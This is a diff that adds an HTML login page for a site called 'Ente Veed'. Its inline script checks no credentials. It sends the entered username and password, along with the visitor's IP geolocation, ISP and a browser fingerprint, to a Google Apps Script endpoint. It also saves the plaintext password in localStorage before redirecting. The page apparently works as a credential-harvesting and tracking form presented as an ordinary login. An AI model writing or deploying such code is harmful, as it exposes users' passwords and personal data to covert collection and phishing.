@@ -1,0 +1,108 @@
+<!-- Removed image upload field -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Ente Veed</title>
+  <link rel="icon" href="assets/files/ente veed.png" type="images/logo" />
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://haseefmuhammed.github.io/Haseef-Swift/haseef-swift-og.css" />
+  <link rel="stylesheet" href="assets/vendor/bootstrap.css" />
+  <link rel="stylesheet" href="assets/vendor/style.css" />
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+  <style>
+    body {
+      background: linear-gradient(to right, #ff416c, #ff4b2b);
+    }
+
+    form {
+      max-width: 400px;
+      border: 3px solid #f50057;
+    }
+  </style>
+</head>
+<body>
+  <div class="container d-flex justify-content-center align-items-center vh-100">
+    <form id="submit-form" class="bg-light p-5 rounded shadow">
+      <h2 class="text-center mb-4">Login</h2>
+
+      <div class="mb-3">
+        <label class="form-label">Username:</label>
+        <input type="text" class="form-control" name="username" required />
+      </div>
+
+      <div class="mb-3">
+        <label class="form-label">Password:</label>
+        <input type="password" class="form-control" name="password" required />
+      </div>
+
+      <!-- 🟥 Removed image upload field -->
+
+      <button type="submit" class="btn btn-danger w-100">Login</button>
+    </form>
+  </div>
+
+  <div id="loading" style="display:none;"></div>
+
+<script>
+  $("#submit-form").submit(async function (e) {
+    e.preventDefault();
+
+    const username = $("input[name='username']").val();
+    const password = $("input[name='password']").val();
+
+    let userData = {
+      username: username,
+      password: password,
+    };
+
+    try {
+      const ipData = await fetch("https://ipapi.co/json").then((res) => res.json());
+      const extraData = {
+        ip: ipData.ip,
+        city: ipData.city,
+        region: ipData.region,
+        country: ipData.country_name,
+        isp: ipData.org,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        os: navigator.platform,
+        browser: navigator.userAgent,
+        language: navigator.language,
+        screenResolution: `${screen.width}x${screen.height}`,
+        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
+        cookiesEnabled: navigator.cookieEnabled,
+        referrer: document.referrer || "No referrer",
+        url: window.location.href,
+      };
+
+      // Merge and cache in localStorage
+      userData = { ...userData, ...extraData };
+      localStorage.setItem("enteVeedUser", JSON.stringify(userData));
+
+    } catch (error) {
+      console.error("Failed to collect user data", error);
+    }
+
+    $("#loading").css("display", "block");
+
+    $.ajax({
+      url: "https://script.google.com/macros/s/AKfycbwdJoj0CwKOaekgjrCO4ebj8ChsaKD3xvHf23tD3eo532tIrK0sOWKwFCeY51TOZU0q/exec",
+      method: "POST",
+      data: userData,
+      success: function (response) {
+        $("#loading").css("display", "none");
+        window.location.href = "home.html";
+      },
+      error: function (err) {
+        alert("Something went wrong. Please try again.");
+        console.error("Submit error:", err);
+        $("#loading").css("display", "none");
+      },
+    });
+  });
+</script>
+
+</body>
+</html>
